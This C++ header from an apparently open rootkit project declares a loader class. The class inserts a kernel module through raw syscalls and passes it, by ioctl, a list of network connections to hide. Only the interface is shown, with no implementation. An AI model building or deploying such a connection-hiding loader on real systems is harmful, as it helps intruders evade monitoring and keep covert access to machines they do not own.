#ifndef ROOTKIT_KERNEL_MODULE_HELPER_H
#define ROOTKIT_KERNEL_MODULE_HELPER_H

#include <optional>
#include <string>
#include <vector>
#include "common.h"
#include "ConfigManager.hpp"
#include "rootkit/issues/Error.hpp"
#include "rootkit/issues/Warning.hpp"
#include "rootkit/issues/Logger.hpp"

# define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)
# define delete_module(mod, flags) syscall(__NR_delete_module, mod, flags)

namespace rootkit {

class RnetLoader {
private:
    RnetConfig conf;
    std::string module_path;
    std::string module_name;
    std::string module_dev_name;

    issues::Error error;
    issues::Warning warning;
    std::vector<conn_info> data;

public:
    /**
     * @brief Load a rnet kernelo module. And send data from configuration to the
     * module.
     * @param conf Configuration for this module
     */
    RnetLoader(const RnetConfig& conf,
        const std::string& module_dev_name,
        const issues::Logger& logger
    );

    /**
     * @brief Unload a kernel module
    */
    ~RnetLoader();

    /**
     * @brief Returns kernel module status
     * @return Returns nullopt if module was loaded correctly, and error message otherwise
     */
    std::optional<std::string> status() const;

    /**
     * @brief Sets internal data for the module, this also sends them to the module via ioctl
     * @param data Data about connection to hide
     * @return Returns true if data was sent correctly to module, false otherwise
     */
    bool set_data(const conn_info& data);

    /**
     * @brief Get current data that are loaded in module, nullopt if no data was loaded in
     */
    std::vector<conn_info> get_data() const;

private:
    /**
     * @brief Sets internal data by config for the module, this also sends them
     * to the module via ioctl. Data is taken from configuration
     * @return Returns true if data was sent correctly to module, false otherwise
     */
    bool set_data();

};

}

#endif
